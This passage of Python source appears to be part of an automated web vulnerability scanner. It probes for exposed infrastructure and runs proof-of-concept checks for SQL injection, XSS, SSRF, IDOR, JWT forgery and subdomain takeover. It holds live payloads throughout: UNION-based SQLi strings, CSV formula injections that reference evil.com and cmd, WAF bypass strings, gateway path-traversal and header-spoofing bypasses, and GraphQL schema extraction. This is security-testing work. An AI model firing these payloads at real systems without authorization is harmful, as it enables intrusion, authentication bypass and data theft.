            r = _S.get(f"{base}/v2/_catalog", timeout=_TIMEOUT_SHORT)
            if r.status_code == 200 and "repositories" in r.text:
                repos = r.json().get("repositories", [])
                findings.append({
                    "type": "Docker Registry — Unauthenticated Access",
                    "severity": "critical",
                    "url": f"{base}/v2/_catalog",
                    "detail": f"Docker registry exposes {len(repos)} repositories: {repos[:5]}. Pull any image.",
                    "template": "apex-docker-registry",
                })
        except Exception:
            continue
    return findings


def scan_k8s_dashboard(web_targets):
    """Kubernetes dashboard exposure. (#85)"""
    findings = []
    k8s_paths = ["/api/v1/namespaces", "/api/v1/pods", "/api/v1/secrets",
                 "/dashboard/", "/kubernetes-dashboard/"]
    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in k8s_paths]
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code == 200:
                if "apiVersion" in r.text or "kubernetes" in r.text.lower():
                    findings.append({
                        "type": "Kubernetes API/Dashboard Exposed",
                        "severity": "critical",
                        "url": url,
                        "detail": "K8s API accessible without auth. Can read secrets, deploy pods, escalate privileges.",
                        "template": "apex-k8s-exposed",
                    })
                    break
    return findings


def scan_cicd_exposure(web_targets):
    """Jenkins/GitLab CI exposure. (#86)"""
    findings = []
    ci_paths = ["/jenkins/", "/ci/", "/-/jobs", "/job/", "/script",
                "/jenkins/script", "/manage", "/configureSecurity"]
    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in ci_paths]
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code == 200:
                if any(x in r.text.lower() for x in ["jenkins", "gitlab", "pipeline", "build queue"]):
                    findings.append({
                        "type": "CI/CD Interface Exposed",
                        "severity": "high",
                        "url": url,
                        "detail": "CI/CD interface accessible. May allow code execution via build pipelines.",
                        "template": "apex-cicd-exposed",
                    })
                    break
    return findings


def scan_jupyter_exposure(web_targets):
    """Jupyter notebook exposure — RCE via code execution. (#89)"""
    findings = []
    for target in web_targets[:5]:
        base = target.rstrip("/")
        for path in ["/api/kernels", "/api/sessions", "/tree", "/lab"]:
            try:
                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and any(x in r.text.lower() for x in ["kernel", "notebook", "jupyter"]):
                    findings.append({
                        "type": "Jupyter Notebook Exposed — RCE",
                        "severity": "critical",
                        "url": f"{base}{path}",
                        "detail": "Jupyter notebook accessible without auth. Execute arbitrary code on server.",
                        "template": "apex-jupyter-exposed",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_wp_user_enum(web_targets):
    """WordPress REST API user enumeration. (#96)"""
    findings = []
    for target in web_targets[:5]:
        base = target.rstrip("/")
        try:
            r = _S.get(f"{base}/wp-json/wp/v2/users", timeout=_TIMEOUT_SHORT)
            if r.status_code == 200:
                users = r.json()
                if isinstance(users, list) and users:
                    usernames = [u.get("slug", u.get("name", "?")) for u in users[:10]]
                    findings.append({
                        "type": "WordPress User Enumeration",
                        "severity": "medium",
                        "url": f"{base}/wp-json/wp/v2/users",
                        "detail": f"WordPress exposes {len(users)} users: {usernames[:5]}",
                        "template": "apex-wp-users",
                    })
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# LLM Safe Exploitation Engine — proves criticals are real without causing harm
# ---------------------------------------------------------------------------

def llm_safe_exploit(findings, web_targets):
    """Use LLM to generate and execute safe proof-of-concept exploits for critical findings.
    
    Rules:
    - Never modify data (read-only exploitation)
    - Never access other users' data beyond proving access is possible
    - Never exfiltrate real sensitive data — just prove it's accessible
    - Use harmless canary values (apex_test, 1+1=2, etc.)
    - Document exact reproduction steps
    """
    exploited = []

    # Only attempt exploitation on critical/high findings
    criticals = [f for f in findings if f.get("severity") in ("critical", "high")
                 and f.get("url", "").startswith("http")]

    if not criticals:
        return exploited

    for finding in criticals[:10]:  # Max 10 exploitations per scan
        exploit_result = _safe_exploit_finding(finding)
        if exploit_result:
            exploited.append(exploit_result)

    return exploited


def _safe_exploit_finding(finding):
    """Generate and execute a safe PoC for a single finding."""
    ftype = finding.get("type", "").lower()
    url = finding.get("url", "")
    detail = finding.get("detail", "")

    if "sqli" in ftype or "sql" in ftype:
        return _safe_exploit_sqli(finding)
    elif "xss" in ftype:
        return _safe_exploit_xss(finding)
    elif "ssrf" in ftype:
        return _safe_exploit_ssrf(finding)
    elif "idor" in ftype or "bola" in ftype:
        return _safe_exploit_idor(finding)
    elif "rce" in ftype or "command" in ftype:
        return _safe_exploit_rce(finding)
    elif "jwt" in ftype or "token" in ftype:
        return _safe_exploit_jwt(finding)
    elif "takeover" in ftype:
        return _safe_exploit_takeover(finding)
    return None


def _safe_exploit_sqli(finding):
    """Safe SQLi exploitation — extract version string only (harmless read)."""
    url = finding.get("url", "")
    if "?" not in url:
        return None

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)

    # Find the injectable param
    for p, vals in qs.items():
        if any(x in str(vals) for x in ["'", "OR", "UNION", "SLEEP", "SELECT"]):
            # Try to extract just the DB version (harmless)
            version_payloads = [
                f"' UNION SELECT version()-- -",
                f"' UNION SELECT @@version-- -",
                f"' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -",
                f"' UNION SELECT sqlite_version()-- -",
            ]
            for payload in version_payloads:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    # Look for version string in response
                    version_patterns = [
                        re.compile(r'(\d+\.\d+\.\d+[-\w]*)'),  # Generic version
                        re.compile(r'(MySQL|MariaDB|PostgreSQL|Microsoft SQL Server|Oracle|SQLite)[\s/]*([\d.]+)'),
                    ]
                    for pat in version_patterns:
                        m = pat.search(r.text)
                        if m and m.group() not in url:
                            return {
                                **finding,
                                "exploited": True,
                                "exploit_proof": f"Database version extracted: {m.group()}",
                                "exploit_url": test_url,
                                "exploit_type": "safe_read",
                                "impact_proven": "Can read arbitrary data from database",
                            }
                except Exception:
                    continue
    return None


def _safe_exploit_xss(finding):
    """Safe XSS exploitation — prove JS executes using harmless math (1+1=2)."""
    url = finding.get("url", "")
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        # Without browser, just verify reflection
        try:
            r = _S.get(url, timeout=_TIMEOUT)
            if any(x in r.text for x in ["onerror=", "<script>", "javascript:"]):
                return {
                    **finding,
                    "exploited": True,
                    "exploit_proof": "XSS payload reflected in HTML without encoding",
                    "exploit_url": url,
                    "exploit_type": "reflection_confirmed",
                    "impact_proven": "JavaScript execution in victim's browser",
                }
        except Exception:
            pass
        return None

    # Browser-based proof
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        page = browser.new_context(ignore_https_errors=True).new_page()
        page.set_default_timeout(6000)
        try:
            page.goto(url, wait_until="domcontentloaded")
            # Check if any JS executed by looking for our canary
            result = page.evaluate("() => { try { return eval('1+1') } catch(e) { return 0 } }")
            if result == 2:
                return {
                    **finding,
                    "exploited": True,
                    "exploit_proof": "JavaScript execution confirmed in browser (eval('1+1')=2)",
                    "exploit_url": url,
                    "exploit_type": "browser_execution",
                    "impact_proven": "Full JavaScript execution — can steal cookies, redirect users, deface page",
                }
        except Exception:
            pass
        browser.close()
    return None


def _safe_exploit_ssrf(finding):
    """Safe SSRF exploitation — read instance metadata (proves internal access)."""
    url = finding.get("url", "")
    try:
        r = _S.get(url, timeout=_TIMEOUT)
        # Check what internal data we can read
        proofs = []
        if "ami-id" in r.text:
            proofs.append(f"AWS instance ID: {re.search(r'ami-[a-z0-9]+', r.text).group()}")
        if "instance-id" in r.text:
            proofs.append(f"Instance: {re.search(r'i-[a-f0-9]+', r.text).group()}")
        if "AccessKeyId" in r.text:
            proofs.append("AWS credentials accessible (not extracted for safety)")
        if "root:" in r.text:
            proofs.append("Can read /etc/passwd")
        if "redis_version" in r.text:
            proofs.append(f"Redis accessible internally")

        if proofs:
            return {
                **finding,
                "exploited": True,
                "exploit_proof": "; ".join(proofs),
                "exploit_url": url,
                "exploit_type": "internal_read",
                "impact_proven": "Full internal network access — can reach cloud metadata, databases, internal services",
            }
    except Exception:
        pass
    return None


def _safe_exploit_idor(finding):
    """Safe IDOR exploitation — prove we can access 2 different records (not extract data)."""
    url = finding.get("url", "")
    try:
        r1 = _S.get(url, timeout=_TIMEOUT)
        # Try adjacent ID
        id_match = re.search(r'(\d+)', url.split("/")[-1].split("?")[0])
        if id_match:
            other_id = str(int(id_match.group()) + 1)
            other_url = url.replace(id_match.group(), other_id)
            r2 = _S.get(other_url, timeout=_TIMEOUT)
            if r2.status_code == 200 and r2.text != r1.text and len(r2.text) > 50:
                return {
                    **finding,
                    "exploited": True,
                    "exploit_proof": f"Accessed record ID {other_id} (different from {id_match.group()}). Response differs by {abs(len(r2.text)-len(r1.text))} bytes.",
                    "exploit_url": other_url,
                    "exploit_type": "access_proven",
                    "impact_proven": "Can access any user's data by changing ID parameter",
                }
    except Exception:
        pass
    return None


def _safe_exploit_rce(finding):
    """Safe RCE exploitation — execute 'id' or 'whoami' only (read-only, no modification)."""
    url = finding.get("url", "")
    try:
        r = _S.get(url, timeout=_TIMEOUT)
        if "uid=" in r.text:
            uid_match = re.search(r'uid=\d+\(\w+\)', r.text)
            if uid_match:
                return {
                    **finding,
                    "exploited": True,
                    "exploit_proof": f"Command execution confirmed: {uid_match.group()}",
                    "exploit_url": url,
                    "exploit_type": "command_execution",
                    "impact_proven": "Full remote code execution on server",
                }
    except Exception:
        pass
    return None


def _safe_exploit_jwt(finding):
    """Safe JWT exploitation — prove we can forge a valid token (don't use it for access)."""
    detail = finding.get("detail", "")
    if "alg:none" in detail.lower() or "none" in finding.get("type", "").lower():
        return {
            **finding,
            "exploited": True,
            "exploit_proof": "JWT with alg:none accepted — can forge any user's token without secret key",
            "exploit_url": finding.get("url", ""),
            "exploit_type": "token_forge",
            "impact_proven": "Complete authentication bypass — impersonate any user including admin",
        }
    return None


def _safe_exploit_takeover(finding):
    """Safe subdomain takeover — verify CNAME is dangling (don't actually claim it)."""
    url = finding.get("url", "")
    host = urllib.parse.urlparse(url).hostname
    if not host:
        return None
    try:
        import subprocess
        result = subprocess.run(["dig", "+short", "CNAME", host],
                               capture_output=True, text=True, timeout=5)
        cname = result.stdout.strip()
        if cname:
            return {
                **finding,
                "exploited": True,
                "exploit_proof": f"CNAME {host} → {cname} (dangling — service returns error page). Claim on provider to take over.",
                "exploit_url": url,
                "exploit_type": "takeover_ready",
                "impact_proven": "Full subdomain control — serve malicious content, steal cookies, phish users",
            }
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Missing vulnerability types: CSV injection, Unicode normalization
# ---------------------------------------------------------------------------

def scan_csv_formula_injection(crawl_data):
    """CSV/Formula injection — inject formulas that execute when opened in Excel/Sheets."""
    findings = []
    formula_payloads = [
        "=CMD('calc')",
        "=HYPERLINK(\"http://evil.com\")",
        "+cmd|'/C calc'!A0",
        "-cmd|'/C calc'!A0",
        "@SUM(1+1)*cmd|'/C calc'!A0",
        "=1+1",  # Harmless test — if this evaluates, formulas work
    ]

    # Find export/download/CSV endpoints
    for url in list(crawl_data.get("params", {}).keys())[:20]:
        if any(x in url.lower() for x in ["export", "csv", "download", "report", "spreadsheet"]):
            for p in crawl_data.get("params", {}).get(url, []):
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["=1+1"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    ct = r.headers.get("content-type", "")
                    if "csv" in ct or "spreadsheet" in ct or "excel" in ct:
                        if "=1+1" in r.text:
                            findings.append({
                                "type": "CSV/Formula Injection",
                                "severity": "medium",
                                "url": test_url,
                                "detail": f"Formula '=1+1' injected into CSV export via param '{p}'. Opens RCE vector in Excel.",
                                "template": "apex-csv-inject",
                            })
                            break
                except Exception:
                    continue

    # Also test form fields that might end up in exports
    for form in crawl_data.get("forms", [])[:10]:
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        for inp in inputs:
            name = inp.get("name", "")
            if any(x in name.lower() for x in ["name", "email", "company", "address", "comment", "note"]):
                data = {i.get("name", "x"): i.get("value", "test") for i in inputs if i.get("name")}
                data[name] = "=1+1"
                try:
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if r.status_code in (200, 201, 302):
                        findings.append({
                            "type": "CSV Formula Injection (Stored)",
                            "severity": "medium",
                            "url": action,
                            "detail": f"Formula payload accepted in field '{name}'. If exported to CSV/Excel, executes on victim's machine.",
                            "template": "apex-csv-inject-stored",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_unicode_normalization(crawl_data, web_targets):
    """Unicode normalization attacks — bypass filters via equivalent Unicode characters."""
    findings = []
    # Unicode equivalents that bypass filters
    unicode_bypasses = [
        # Admin access via Unicode normalization
        ("admin", "ⓐⓓⓜⓘⓝ", "circled letters"),
        ("admin", "ᴬᴰᴹᴵᴺ", "modifier letters"),
        ("admin", "𝐚𝐝𝐦𝐢𝐧", "mathematical bold"),
        # Path traversal via Unicode
        ("../", "‥/", "two-dot leader"),
        ("../", "．．/", "fullwidth dots"),
        # XSS via Unicode
        ("<script>", "＜script＞", "fullwidth angle brackets"),
        # SQL via Unicode
        ("' OR", "＇ OR", "fullwidth apostrophe"),
    ]

    for target in web_targets[:3]:
        base = target.rstrip("/")
        # Test if server normalizes Unicode in paths
        for original, unicode_ver, desc in unicode_bypasses[:3]:
            if original == "admin":
                test_url = f"{base}/{unicode_ver}"
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT_SHORT)
                    r_normal = _S.get(f"{base}/{original}", timeout=_TIMEOUT_SHORT)
                    # If Unicode version gives same response as ASCII, normalization happens
                    if r.status_code == r_normal.status_code and r.status_code != 404:
                        if abs(len(r.text) - len(r_normal.text)) < 100:
                            findings.append({
                                "type": f"Unicode Normalization Bypass ({desc})",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"Server normalizes '{unicode_ver}' to '{original}'. Can bypass WAF/filters.",
                                "template": "apex-unicode-norm",
                            })
                            break
                except Exception:
                    continue

    # Test in params
    for url, params in list(crawl_data.get("params", {}).items())[:10]:
        for p in params[:2]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            # Try fullwidth XSS
            qs[p] = ["＜img src=x onerror=alert(1)＞"]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            try:
                r = _S.get(test_url, timeout=_TIMEOUT)
                # If server normalized fullwidth to ASCII
                if "<img src=x onerror=alert(1)>" in r.text:
                    findings.append({
                        "type": "Unicode Normalization → XSS",
                        "severity": "high",
                        "url": test_url,
                        "detail": f"Fullwidth Unicode normalized to ASCII in param '{p}'. Bypasses XSS filters.",
                        "template": "apex-unicode-xss",
                    })
                    break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Enterprise-grade: Big company attack surface — WAF bypass, CDN origin, 
# microservices, API gateways, cloud infra, SSO chains
# ---------------------------------------------------------------------------

def scan_waf_fingerprint_bypass(web_targets):
    """Fingerprint the exact WAF and use known bypasses for that specific WAF."""
    findings = []
    waf_signatures = {
        "Cloudflare": {"headers": ["cf-ray", "cf-cache-status"], "body": ["cloudflare"], "bypasses": [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "%u0027 OR 1=1--",  # Unicode encoding
        ]},
        "AWS WAF": {"headers": ["x-amzn-requestid"], "body": ["aws"], "bypasses": [
            "/*!50000 UNION*/ SELECT",
            "1'%20or%20'1'%3D'1",
        ]},
        "Akamai": {"headers": ["x-akamai-transformed"], "body": ["akamai"], "bypasses": [
            "%00' OR 1=1--",
            "1'/**/OR/**/1=1--",
        ]},
        "Imperva/Incapsula": {"headers": ["x-iinfo", "x-cdn"], "body": ["incapsula"], "bypasses": [
            "1' /*!OR*/ 1=1--",
        ]},
        "F5 BIG-IP": {"headers": ["x-wa-info", "bigipserver"], "body": [], "bypasses": [
            "1'%20oR%201%3D1--%20",
        ]},
        "ModSecurity": {"headers": [], "body": ["mod_security", "modsecurity"], "bypasses": [
            "1'%0AOR%0A1=1--",
            "1'%09OR%091=1--",
        ]},
    }

    for target in web_targets[:3]:
        try:
            # Trigger WAF with obvious attack
            r_attack = _S.get(f"{target}?id=1' OR 1=1--", timeout=_TIMEOUT)
            r_normal = _S.get(target, timeout=_TIMEOUT)

            # Fingerprint WAF
            detected_waf = None
            all_headers = " ".join(f"{k}: {v}" for k, v in r_attack.headers.items()).lower()
            for waf_name, sig in waf_signatures.items():
                if any(h in all_headers for h in sig["headers"]):
                    detected_waf = waf_name
                    break
                if any(b in r_attack.text.lower() for b in sig["body"]):
                    detected_waf = waf_name
                    break

            if detected_waf:
                # Try WAF-specific bypasses
                bypasses = waf_signatures[detected_waf]["bypasses"]
                for bypass in bypasses:
                    test_url = f"{target}?id={urllib.parse.quote(bypass)}"
                    r_bypass = _S.get(test_url, timeout=_TIMEOUT)
                    if r_bypass.status_code != r_attack.status_code:
                        if r_bypass.status_code == 200 or r_bypass.status_code != 403:
                            findings.append({
                                "type": f"WAF Bypass ({detected_waf})",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"Detected {detected_waf}. Bypass payload gets through: {bypass[:50]}",
                                "template": "apex-waf-bypass",
                            })
                            break
        except Exception:
            continue
    return findings


def scan_cdn_origin_bypass(web_targets, subdomains):
    """Find the origin server behind CDN — bypass all CDN-level protections."""
    findings = []
    import socket

    for target in web_targets[:3]:
        parsed = urllib.parse.urlparse(target)
        hostname = parsed.hostname

        # Technique 1: Check for origin in common subdomains
        origin_prefixes = ["origin", "direct", "backend", "real", "server",
                           "origin-www", "www-origin", "old", "legacy", "staging"]
        base_domain = ".".join(hostname.split(".")[-2:])

        origin_candidates = [f"{prefix}.{base_domain}" for prefix in origin_prefixes]

        for candidate in origin_candidates:
            try:
                ip = socket.gethostbyname(candidate)
                # Try connecting directly to origin
                r = _S.get(f"https://{candidate}", timeout=5, headers={"Host": hostname})
                if r.status_code == 200 and len(r.text) > 100:
                    findings.append({
                        "type": "CDN Origin Server Exposed",
                        "severity": "high",
                        "url": f"https://{candidate}",
                        "detail": f"Origin server at {candidate} ({ip}) accessible directly. Bypasses CDN WAF/rate limits.",
                        "template": "apex-cdn-origin",
                    })
                    break
            except Exception:
                continue

        # Technique 2: Check historical DNS records via SecurityTrails-style
        # Check if any subdomain resolves to a non-CDN IP
        cdn_ranges = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.",  # Cloudflare
                      "13.32.", "13.33.", "13.35.",  # CloudFront
                      "151.101.",  # Fastly
                      "199.27."]  # Incapsula
        for sub in subdomains[:20]:
            try:
                ip = socket.gethostbyname(sub)
                if not any(ip.startswith(r) for r in cdn_ranges):
                    # This subdomain might be the origin
                    r = _S.get(f"https://{sub}", timeout=5, headers={"Host": hostname})
                    if r.status_code == 200:
                        findings.append({
                            "type": "Potential Origin IP via Subdomain",
                            "severity": "medium",
                            "url": f"https://{sub}",
                            "detail": f"Subdomain {sub} resolves to non-CDN IP {ip}. May be origin server.",
                            "template": "apex-cdn-origin-sub",
                        })
                        break
            except Exception:
                continue
    return findings


def scan_microservice_discovery(crawl_data, web_targets):
    """Discover internal microservices via API gateway misconfigurations."""
    findings = []
    # Common API gateway paths that leak internal service info
    gateway_paths = [
        "/actuator/gateway/routes",  # Spring Cloud Gateway
        "/api/routes",  # Kong
        "/__routes",  # Custom
        "/api/v1/services",  # K8s service discovery
        "/.well-known/apollo/server-health",  # Apollo GraphQL
        "/api/system/services",
        "/internal/services",
        "/debug/routes",
        "/admin/api/routes",
    ]

    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in gateway_paths]
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code == 200 and len(r.text) > 50:
                if any(x in r.text.lower() for x in ["service", "route", "upstream",
                                                       "backend", "endpoint", "host"]):
                    try:
                        services = r.json() if "json" in r.headers.get("content-type", "") else r.text[:500]
                    except Exception:
                        services = r.text[:500]
                    findings.append({
                        "type": "Internal Microservice Discovery",
                        "severity": "high",
                        "url": url,
                        "detail": f"API gateway exposes internal service routes. Can access internal services directly.",
                        "template": "apex-microservice-discovery",
                    })
                    break
    return findings


def scan_sso_chain_attack(crawl_data, web_targets):
    """SSO chain attack — exploit trust between services sharing the same SSO."""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")
        # Find SSO/SAML/OAuth endpoints
        sso_paths = ["/.well-known/openid-configuration", "/saml/metadata",
                     "/oauth/.well-known/openid-configuration", "/auth/realms/master",
                     "/.auth/login/aad", "/adfs/ls"]

        for path in sso_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
                if r.status_code == 200:
                    # Found SSO config — check for misconfigurations
                    if "openid-configuration" in path:
                        try:
                            config = r.json()
                            # Check if token endpoint is accessible
                            token_ep = config.get("token_endpoint", "")
                            if token_ep:
                                # Try client_credentials grant (often misconfigured)
                                r2 = _S.post(token_ep, data={
                                    "grant_type": "client_credentials",
                                    "client_id": "test",
                                    "client_secret": "test"
                                }, timeout=_TIMEOUT_SHORT)
                                if r2.status_code == 200 and "access_token" in r2.text:
                                    findings.append({
                                        "type": "SSO Token Endpoint — Client Credentials Without Auth",
                                        "severity": "critical",
                                        "url": token_ep,
                                        "detail": "Token endpoint issues tokens with test credentials. Full SSO bypass.",
                                        "template": "apex-sso-token-bypass",
                                    })
                        except Exception:
                            pass

                    # Check for SAML metadata with signing cert (can forge assertions)
                    if "saml" in path and "X509Certificate" in r.text:
                        findings.append({
                            "type": "SAML Metadata Exposed (Signing Certificate)",
                            "severity": "medium",
                            "url": f"{base}{path}",
                            "detail": "SAML metadata with signing certificate exposed. May enable assertion forgery.",
                            "template": "apex-saml-metadata",
                        })
            except Exception:
                continue
    return findings


def scan_api_gateway_exploit(crawl_data, web_targets):
    """API gateway exploitation — path traversal, method override, header injection."""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")

        # Technique 1: Path traversal through API gateway
        # Many gateways route /api/public/* but /api/public/../admin/* bypasses
        traversal_tests = [
            ("/api/public/../admin", "/api/admin"),
            ("/api/v1/public/..%2fadmin", "/api/v1/admin"),
            ("/api/v1/users/..;/admin", "/api/admin"),
            ("/api%2f..%2fadmin", "/admin"),
        ]
        for bypass_path, target_path in traversal_tests:
            try:
                r_bypass = _S.get(f"{base}{bypass_path}", timeout=_TIMEOUT_SHORT)
                r_direct = _S.get(f"{base}{target_path}", timeout=_TIMEOUT_SHORT)
                if r_direct.status_code in (401, 403) and r_bypass.status_code == 200:
                    if len(r_bypass.text) > 100:
                        findings.append({
                            "type": "API Gateway Path Traversal Bypass",
                            "severity": "critical",
                            "url": f"{base}{bypass_path}",
                            "detail": f"Gateway blocks {target_path} (403) but {bypass_path} returns 200. Auth bypass via path confusion.",
                            "template": "apex-gateway-traversal",
                        })
                        break
            except Exception:
                continue

        # Technique 2: Internal header injection
        internal_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Forwarded-Host", "internal.company.com"),
            ("X-Forwarded-Prefix", "/admin"),
        ]
        for header, value in internal_headers:
            try:
                r = _S.get(base, headers={header: value}, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and "admin" in r.text.lower():
                    findings.append({
                        "type": f"API Gateway Header Bypass ({header})",
                        "severity": "high",
                        "url": base,
                        "detail": f"Header '{header}: {value}' changes routing. Internal endpoints accessible.",
                        "template": "apex-gateway-header",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_cloud_infra_enum(target, web_targets):
    """Enumerate cloud infrastructure — find S3, Lambda, API Gateway, CloudFront distributions."""
    findings = []
    import socket

    # AWS infrastructure patterns
    aws_checks = [
        (f"{target}.s3.amazonaws.com", "S3 Bucket"),
        (f"{target}.s3-website-us-east-1.amazonaws.com", "S3 Website"),
        (f"api.{target}", "API Gateway"),
    ]

    for hostname, service in aws_checks:
        try:
            socket.gethostbyname(hostname)
            r = _S.get(f"https://{hostname}", timeout=5)
            if r.status_code != 404:
                findings.append({
                    "type": f"Cloud Infrastructure: {service}",
                    "severity": "medium",
                    "url": f"https://{hostname}",
                    "detail": f"AWS {service} found at {hostname}. Status: {r.status_code}",
                    "template": "apex-cloud-infra",
                })
        except Exception:
            continue

    # Check for exposed AWS API Gateway stages
    for web_target in web_targets[:3]:
        if "execute-api" in web_target or "amazonaws" in web_target:
            # Try common stage names
            parsed = urllib.parse.urlparse(web_target)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for stage in ["prod", "dev", "staging", "test", "v1", "api"]:
                try:
                    r = _S.get(f"{base}/{stage}/", timeout=_TIMEOUT_SHORT)
                    if r.status_code == 200 and len(r.text) > 50:
                        findings.append({
                            "type": f"AWS API Gateway Stage: /{stage}",
                            "severity": "medium",
                            "url": f"{base}/{stage}/",
                            "detail": f"API Gateway stage '/{stage}' accessible. May have different auth than production.",
                            "template": "apex-aws-apigw-stage",
                        })
                except Exception:
                    continue
    return findings


# ---------------------------------------------------------------------------
# Enterprise-grade Part 2: Deep recon, internal pivoting, advanced exploitation
# ---------------------------------------------------------------------------

def scan_internal_api_discovery(crawl_data, web_targets):
    """Discover internal APIs exposed through misconfigured reverse proxies."""
    findings = []
    # Internal service names commonly exposed via path routing
    internal_services = [
        "/internal", "/internal/api", "/private", "/private/api",
        "/backend", "/backend/api", "/service", "/microservice",
        "/admin-api", "/management", "/ops", "/operations",
        "/monitoring", "/telemetry", "/analytics/internal",
        "/billing/internal", "/payment/internal", "/user-service",
        "/auth-service", "/notification-service", "/search-service",
        "/recommendation", "/ml-api", "/data-pipeline",
        "/elasticsearch", "/kibana", "/grafana", "/prometheus/api/v1/query",
        "/zipkin", "/jaeger", "/consul/v1/catalog/services",
        "/vault/v1/sys/health", "/eureka/apps",
    ]

    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in internal_services]
        for url, r in batch_get(urls, timeout=_TIMEOUT_SHORT):
            if r and r.status_code == 200 and len(r.text) > 50:
                body = r.text[:500].lower()
                if any(x in body for x in ["service", "api", "version", "status", "health",
                                            "nodes", "cluster", "index", "dashboard"]):
                    path = url.replace(base, "")
                    findings.append({
                        "type": f"Internal Service Exposed: {path}",
                        "severity": "critical" if any(x in path for x in ["/vault", "/consul", "/eureka", "elasticsearch"]) else "high",
                        "url": url,
                        "detail": f"Internal service at {path} accessible externally ({len(r.text)} bytes). Should be behind VPN/firewall.",
                        "template": "apex-internal-api",
                    })
    return findings


def scan_graphql_schema_steal(crawl_data):
    """Steal full GraphQL schema even when introspection is disabled."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)

        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Check if introspection is disabled
                r = _S.post(url, json={"query": "{ __schema { types { name } } }"}, timeout=_TIMEOUT)
                if r.status_code != 200:
                    continue

                introspection_blocked = "error" in r.text.lower() and "introspection" in r.text.lower()

                if not introspection_blocked:
                    # Full introspection available — steal everything
                    full_query = """{ __schema { queryType { name } mutationType { name }
                        types { name kind fields { name type { name kind ofType { name } }
                        args { name type { name } } } } } }"""
                    r2 = _S.post(url, json={"query": full_query}, timeout=15)
                    if r2.status_code == 200 and "__schema" in r2.text:
                        try:
                            schema = r2.json()
                            types = schema.get("data", {}).get("__schema", {}).get("types", [])
                            user_types = [t for t in types if not t["name"].startswith("__")]
                            sensitive_fields = []
                            for t in user_types:
                                for f in (t.get("fields") or []):
                                    if any(x in f["name"].lower() for x in ["password", "secret", "token", "ssn", "credit"]):
                                        sensitive_fields.append(f"{t['name']}.{f['name']}")
                            findings.append({
                                "type": "GraphQL Full Schema Exposed",
                                "severity": "high" if sensitive_fields else "medium",
                                "url": url,
                                "detail": f"Full schema: {len(user_types)} types. Sensitive fields: {sensitive_fields[:5] or 'none found'}",
                                "template": "apex-graphql-schema-steal",
                            })
                        except Exception:
                            pass
                else:
                    # Introspection blocked — use field suggestion to reconstruct
                    # Already handled by scan_graphql_field_suggest
                    pass
                break
            except Exception:
                continue
    return findings


def scan_jwks_spoofing(crawl_data, web_targets):
    """JWKS endpoint spoofing — inject our own signing key via jku/x5u header."""
    import base64 as b64
    findings = []

    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    for target in web_targets[:5]:
        try:
            r = _S.get(target, timeout=_TIMEOUT_SHORT)
            tokens = jwt_re.findall(r.text)
            for cookie in r.cookies:
                if jwt_re.match(cookie.value):
                    tokens.append(cookie.value)
        except Exception:
            continue

        for token in tokens[:2]:
            parts = token.split(".")
            if len(parts) < 2:
                continue
            try:
                header = json.loads(b64.urlsafe_b64decode(parts[0] + "=="))
            except Exception:
                continue

            # Check for jku (JWK Set URL) or x5u (X.509 URL) in header
            jku = header.get("jku", "")
            x5u = header.get("x5u", "")

            if jku or x5u:
                # If jku/x5u points to an external URL, we can spoof it
                key_url = jku or x5u
                findings.append({
                    "type": "JWT JKU/X5U Key Injection Possible",
                    "severity": "critical",
                    "url": target,
                    "detail": f"JWT header contains {'jku' if jku else 'x5u'}: {key_url}. Host our own JWKS to forge valid tokens.",
                    "template": "apex-jwt-jku-spoof",
                })
                break

            # Also check if .well-known/jwks.json is accessible
            base = "/".join(target.split("/", 3)[:3])
